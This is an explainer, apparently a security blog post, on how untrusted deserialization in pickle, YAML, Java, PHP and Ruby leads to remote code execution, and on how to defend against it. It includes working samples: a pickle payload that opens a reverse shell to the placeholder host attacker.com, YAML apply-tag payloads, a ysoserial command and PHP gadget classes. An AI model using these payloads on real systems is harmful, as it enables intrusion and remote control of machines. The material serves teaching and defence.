<!-- tags: security-research, application-security, rce -->
<!-- date: 2025-11-19 -->
# Serialization as Remote Code Execution: Why Untrusted Deserialization Is Eval With Extra Steps

*A technical explainer on how object deserialization becomes arbitrary code execution. Written for engineers defending systems and those building them wrong.*

---

## The Thesis

Serialization turns objects into bytes. Deserialization turns bytes back into objects. If those bytes come from an untrusted source — a cookie, an API response, a message queue, a form field — the attacker controls which objects get created, what state they have, and in many languages, what code runs during construction or destruction. `pickle.loads()`, Java `ObjectInputStream`, PHP `unserialize()`, Ruby `Marshal.load()`, YAML `yaml.load()` — these aren't data parsers. **They are eval() with extra steps.**

---

## Why Serialization Exists

Serialization serves a purpose. You need to:
- Store session state in a database or cookie
- Cache complex objects in Redis
- Pass messages through a queue or RPC system
- Send structured data over HTTP with more fidelity than JSON

The obvious solution: convert the object to bytes, ship those bytes, then convert them back on the other end. In theory, clean. In practice, a loaded gun.

---

## Python Pickle: The Canonical Example

Python's `pickle` module is the textbook case. Here's why.

### What Pickle Does (When It's Safe)

```python
import pickle

# Safe: user is controlled data, pickle is convenience
class User:
    def __init__(self, name, email):
        self.name = name
        self.email = email

user = User("alice", "alice@example.com")
pickled = pickle.dumps(user)  # bytes
restored = pickle.loads(pickled)  # object restored
```

This works. The bytes represent the object's state. Deserialization recreates it.

### What Pickle Does (When It's Weaponized)

Pickle isn't limited to storing state. It has bytecode instructions that can construct arbitrary objects and call arbitrary methods. The `__reduce__` magic method exists specifically for this:

```python
import pickle
import subprocess

class Exploit:
    def __reduce__(self):
        # When unpickled, this runs: subprocess.run(['touch', '/tmp/pwned'])
        return (subprocess.run, (['touch', '/tmp/pwned'],))

malicious_pickle = pickle.dumps(Exploit())

# On the victim's machine:
# pickle.loads(malicious_pickle)  # EXECUTES: touch /tmp/pwned
```

The attacker never instantiates the `Exploit` object in their code. They just *serialize* an instruction to deserialize it elsewhere. When `pickle.loads()` runs on the victim's machine, the `__reduce__` method is called **during deserialization**, not after. Code execution happens before any validation logic can run.

Here's a more complete RCE chain:

```python
import pickle
import subprocess
import os

class RCE:
    def __reduce__(self):
        # Command to run: reverse shell
        cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())
print(payload)  # This is harmless bytes

# But: send it anywhere deserialization happens
# A web server that does: pickle.loads(request.form['state'])
# A worker that does: obj = pickle.loads(cache_entry)
# A message queue consumer: msg = pickle.loads(queue_message)
#
# Any of these: RCE on that machine as the app's user
```

**The critical point:** The attacker's code doesn't run `os.system()` directly. The victim's deserialization does. That's the escape hatch.

### Why Validation Doesn't Help

The naive defense is "validate the pickle before loading":

```python
# This doesn't work
try:
    obj = pickle.loads(untrusted_data)
except Exception:
    pass
```

**The code executes during the deserialization call.** By the time `loads()` returns, the damage is done. You can't validate before deserializing — the validation happens too late.

Even "safe" deserialization doesn't help:

```python
# pickle.DEFAULT_PROTOCOL is 4, pickle.HIGHEST_PROTOCOL is 5
# Different pickle versions = different bytecode instructions = different exploits
# But the core problem remains: __reduce__ and similar hooks run during unpickling
```

---

## Python YAML: The Supply Chain Attack

YAML is often treated as "safer" than pickle. It's not. It's a different shape of the same vulnerability.

### `yaml.load()` vs `yaml.safe_load()`

```python
import yaml

# VULNERABLE
config = yaml.load(untrusted_yaml_string, Loader=yaml.FullLoader)

# CORRECT (as of PyYAML 5.1+)
config = yaml.safe_load(untrusted_yaml_string)
```

The difference: `FullLoader` (and `UnsafeLoader`) support arbitrary Python object instantiation through the `!!python/object/apply` tag.

Here's the RCE:

```yaml
!!python/object/apply:subprocess.Popen
args:
  - bash -c 'echo pwned > /tmp/rce'
```

When `yaml.load()` with `FullLoader` parses this:
1. It sees `!!python/object/apply`
2. It identifies the class: `subprocess.Popen`
3. It instantiates it with `args` as the constructor argument
4. The shell command runs

```python
import yaml
import subprocess

malicious_yaml = """
!!python/object/apply:subprocess.Popen
args:
  - - bash
    - -c
    - 'id > /tmp/pwned.txt'
"""

# This EXECUTES the command during parsing:
# obj = yaml.load(malicious_yaml, Loader=yaml.FullLoader)
```

Why does this happen? YAML is designed to be a serialization format for "any" object, and Python's implementation treats that literally. The `!!python/object/apply` tag is a deliberate feature to serialize callable objects. But if the YAML comes from an attacker, they don't need to serialize their own code — they need to instantiate *your* code with attacker-controlled arguments.

`yaml.safe_load()` removes these tags. It only deserializes primitive types: strings, numbers, lists, dicts. No arbitrary objects. No code execution.

---

## Java Deserialization: Gadget Chains

Java's serialization vulnerability (CVE-2015-4852, exploited in the wild since ~2015) is more complex because it relies on gadget chains.

Java doesn't have a built-in `__reduce__` equivalent. But it *does* have `readObject()` methods that run during deserialization. If you can chain object instantiation and method calls through commonly-available libraries, you can execute code.

### How It Works

A gadget chain is a sequence of classes where:
1. Class A's `readObject()` calls a method on Class B
2. Class B (from a library like Apache Commons Collections) has a side-effect when instantiated or compared
3. Class C's comparator or iterator triggers code execution

For example, with Apache Commons Collections:

```
1. Attacker serializes a ChainedTransformer
2. ChainedTransformer has a chain of transformers that call Runtime.getRuntime().exec()
3. During deserialization, readObject() triggers the chain
4. Code executes
```

The most famous tool for this is `ysoserial`, which generates gadget chain payloads:

```bash
# Generate a Java serialized object that executes a command
java -jar ysoserial.jar CommonsCollections5 'bash -c "reverse shell"' | base64
```

The resulting bytes look innocent — they're a serialized Java object. But when a vulnerable application does:

```java
ObjectInputStream ois = new ObjectInputStream(untrustedInput);
Object obj = ois.readObject();  // RCE happens here
```

The gadget chain executes.

### Why This Is Hard to Patch

Java's serialization is deep in the standard library. Many frameworks (Spring, Hibernate, etc.) use it for session management, distributed caching, and RPC. Simply disabling serialization breaks applications. Instead, defenders must:
- Update every library that's part of a gadget chain (Commons Collections, Rome, Spring Framework, etc.)
- Use serialization filters to allowlist safe classes (Java 9+)
- Monitor for suspicious serialized data (shape of the bytes before deserialization)

The attack surface is **systemic**, not a single bug.

---

## PHP Unserialize: Magic Methods as Gadgets

PHP's `unserialize()` function has the same problem, triggered through magic methods.

```php
<?php

class Exploit {
    public $cmd;

    // __destruct runs when the object is destroyed (end of scope, unset, etc.)
    public function __destruct() {
        system($this->cmd);
    }
}

$serialized = 'O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}';
unserialize($serialized);  // When the object goes out of scope: system('id')
```

Or using `__wakeup()`, which runs during deserialization:

```php
class Exploit {
    public function __wakeup() {
        system($_GET['cmd']);
    }
}

// If user-controlled data reaches unserialize():
$obj = unserialize($_COOKIE['user_data']);  // __wakeup() fires immediately
```

The exploit is similar to Python/Java: chain object instantiation and magic method execution. Libraries with `__destruct()` or `__wakeup()` methods that do side effects (file writes, database queries, function calls) become gadgets.

Tools like `phpggc` enumerate gadget chains in popular PHP frameworks (Laravel, Symfony, WordPress plugins, etc.).

---

## Where Untrusted Deserialization Hides

The vulnerability is most dangerous where you'd least expect it:

### Cookies and Session State

```python
# Flask app with pickle-based sessions
from flask import Flask, session
app = Flask(__name__)

@app.route('/login')
def login():
    user_id = request.args.get('id')
    # Storing complex state in a cookie
    session['user'] = {'id': user_id, 'role': 'admin'}  # Flask serializes this
    return "Logged in"

# If Flask uses pickle instead of JSON, or if the app does:
session['cached_obj'] = pickle.dumps(untrusted_data)
```

Cookies are attacker-controlled. If the cookie contains a serialized object, deserialization is the attack point.

### Hidden Form Fields

```html
<form method="POST">
    <!-- This field looks like state but is actually serialized data -->
    <input type="hidden" name="cart" value="base64-encoded-pickled-shopping-cart">
    <input type="submit">
</form>
```

The application might do:

```python
@app.route('/checkout', methods=['POST'])
def checkout():
    import base64, pickle
    cart = pickle.loads(base64.b64decode(request.form['cart']))
    # RCE if cart is malicious
```

### Message Queues and Distributed Caching

```python
# Worker consuming from a message queue
import pickle
import redis

cache = redis.Redis()

# Attacker puts malicious pickle in Redis
def process_message(queue_name):
    msg = cache.get(queue_name)
    obj = pickle.loads(msg)  # RCE if attacker controls Redis
```

Deserialization is the natural choice here — complex object graphs need to traverse the network. But if the attacker can write to the queue or cache, they've won.

### JWT Payloads

Some applications (incorrectly) use serialized objects in JWT claims:

```python
import jwt
import pickle
import base64

token = request.headers['Authorization'].split(' ')[1]
decoded = jwt.decode(token, 'secret')
user = pickle.loads(base64.b64decode(decoded['user']))  # RCE here
```

If the secret is weak or compromised, the attacker crafts a JWT with a malicious serialized object in the payload.

### APIs and Message Protocols

Any API that accepts serialized data as input:
- gRPC with unsafe deserialization
- RabbitMQ messages with pickle payloads
- Custom RPC protocols that deserialize arbitrary types
- Webhooks that expect serialized objects

---

## Why "Just Validate the Data" Fails

Every defense article says "validate input." For deserialization, it's helpless.

```python
# Doesn't work
def validate_pickle(data):
    # Try to check the pickle structure
    try:
        obj = pickle.loads(data)
        # Validation happens HERE, but code already executed ABOVE
        if not isinstance(obj, User):
            raise ValueError("Bad type")
    except Exception as e:
        raise ValueError(f"Invalid: {e}")
```

The code runs **during** deserialization, not after. The `__reduce__`, `__destruct__`, `__wakeup()`, gadget chains — they all execute as part of the `loads()` / `readObject()` / `unserialize()` call.

Validation isn't too late. It's after the explosion.

---

## What Actually Works

### 1. Never Deserialize Untrusted Data

This is the real answer. If you control the input format, don't use serialization formats that execute code.

**Use JSON, MessagePack, or Protocol Buffers instead:**

```python
import json

# SAFE: JSON is a data format, not executable
user_data = json.loads(request.form['user'])
# At worst, you get a dict with unexpected keys or types
# You don't get code execution

# SAFE: Protocol Buffers
pb = UserMessage()
pb.ParseFromString(request.data)
# Type-safe deserialization, no code execution
```

These formats *cannot* express arbitrary code execution, by design.

### 2. Integrity Checking (If You Must Deserialize)

If you absolutely must deserialize, use HMAC to verify that *you* created the bytes, not the attacker.

```python
import hmac
import hashlib
import pickle

def safe_pickle_dumps(obj, secret_key):
    data = pickle.dumps(obj)
    signature = hmac.new(secret_key, data, hashlib.sha256).digest()
    return data + signature

def safe_pickle_loads(signed_data, secret_key):
    data = signed_data[:-32]  # Last 32 bytes are the HMAC-SHA256
    signature = signed_data[-32:]

    expected_sig = hmac.new(secret_key, data, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected_sig):
        raise ValueError("Signature mismatch")

    return pickle.loads(data)
```

This doesn't prevent deserialization attacks, but it ensures the data came from your server, not an attacker. If your secret key is safe, the attacker can't craft valid signed payloads.

**Caveat:** This protects against network attackers, not against compromised servers or leaked keys.

### 3. Language-Specific Safe Alternatives

**Python:**
- Replace `pickle.loads(untrusted_data)` with `json.loads()` or `yaml.safe_load()`
- If you need pickle for internal use only, sign it with HMAC

**Java:**
- Use serialization filters (Java 9+):
  ```java
  ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("java.base/*;!*");
  ois.setObjectInputFilter(filter);
  ```
- Or replace with JSON (Jackson, Gson, etc.)

**PHP:**
- Replace `unserialize()` with `json_decode()`
- If you must use objects, use `JsonSerializable` and `json_encode()`

**Ruby:**
- Replace `Marshal.load()` with `JSON.parse()` or `YAML.safe_load()`

**General:**
- Use structured formats (JSON, protobuf) by default
- Only use native serialization (pickle, Java serialization, PHP unserialize) for internal, controlled data flows
- If deserialization is necessary, control the format strictly and validate the schema

### 4. Type Allowlists (Limited Defense)

Some languages support restricting which types can be deserialized:

```java
// Java 9+ - allowlist safe types
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.util.*;java.lang.String;myapp.SafeType;!*"
);
ois.setObjectInputFilter(filter);
ois.readObject();  // Will reject anything not in the allowlist
```

```python
# Python pickle with restricted classes
import pickle

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow specific classes
        if module == "myapp" and name in ("User", "Config"):
            return getattr(sys.modules[module], name)
        raise pickle.UnpicklingError(f"Forbidden: {module}.{name}")

obj = RestrictedUnpickler(io.BytesIO(untrusted_data)).load()
```

This works but is **brittle**: every gadget chain relies on classes that already exist in the target environment. As libraries update, new chains emerge. You'd need to know every class that could possibly be exploited.

---

## The Pattern Across Languages

What unites pickle, Java serialization, PHP unserialize, Ruby Marshal, and YAML is the same architectural flaw:

1. **The format is Turing-complete.** It can express not just data but instructions.
2. **Deserialization is code execution in disguise.** Magic methods, constructors, and factory methods run during loading.
3. **Validation is too late.** The attacker's code runs before your validation logic.
4. **The default is unsafe.** Safe alternatives exist (JSON, protobuf) but require deliberate choice.

---

## Spotting the Vulnerability in Code Review

When you see one of these patterns, ask hard questions:

```python
# RED FLAG: pickle + untrusted source
obj = pickle.loads(request.form['data'])
obj = pickle.loads(redis.get(key))
obj = pickle.loads(cache_entry)
obj = pickle.loads(base64.b64decode(cookie))

# RED FLAG: Java deserialization without a filter
ObjectInputStream ois = new ObjectInputStream(untrustedInput);
Object obj = ois.readObject();

# RED FLAG: PHP unserialize on user input
$user = unserialize($_REQUEST['user']);
$data = unserialize($_COOKIE['session']);

# RED FLAG: YAML with FullLoader
config = yaml.load(file_content, Loader=yaml.FullLoader)

# RED FLAG: Ruby Marshal on untrusted data
obj = Marshal.load(file_content)
```

Ask: "Where does this data come from? Could an attacker control it?" If yes, push back.

---

## The High-Level Summary

Serialization is a convenience. But it's a **convenience that executes code**. Deserialization isn't parsing — it's instantiation and method invocation.

If the bytes come from an attacker:
- They control which objects are created
- They control the state those objects have
- They control what code runs during construction and destruction

This is why `pickle.loads()`, Java `ObjectInputStream`, PHP `unserialize()`, Ruby `Marshal.load()`, and YAML `yaml.load()` are all **equivalent to eval()** when given untrusted input. The attack surface is the serialization format itself.

The only real defense is the one that's been obvious since 2005: **don't use serialization formats that execute code**. Use JSON. Use Protocol Buffers. Use MessagePack. Use anything that's purely data.

For legacy systems that can't migrate, use HMAC signing to verify you created the bytes. For everything else, treat deserialization as a security boundary.

---

*Last updated: November 2025*

## References

- [OWASP: Deserialization of Untrusted Data](https://owasp.org/www-community/deserialization-of-untrusted-data/)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Python Pickle Documentation — Security Considerations](https://docs.python.org/3/library/pickle.html#what-can-pickle-do)
- [Ned Batchelder: Pickle Is Not JSON](https://nedbatchelder.com/blog/202001/pickle_is_not_json.html)
- [ysoserial: A Tool for Generating Java Deserialization Payloads](https://github.com/frohoff/ysoserial)
- [Oracle: Java Deserialization Filter Specification](https://openjdk.org/jeps/290)
- [philipphauer: Why You Shouldn't Use Java Serialization](https://philipphauer.de/study/security/java-deserialization-attack/)
- [phpggc: PHP Gadget Chain Generator](https://github.com/ambionics/phpggc)
- [CVE-2015-4852: Oracle Java Deserialization RCE](https://www.cvedetails.com/cve/CVE-2015-4852/)
- [YAML Security: FullLoader vs SafeLoader](https://yaml.readthedocs.io/en/latest/api/#unsafe-loading)
- [Black Hat: Marshalsec — Using Java Deserialization for Remote Code Execution](https://www.blackhat.com/us-16/materials/us-16-Lawrence-marshalsec-Blazing-Fast-Deserialization-Attacks-wp.pdf)
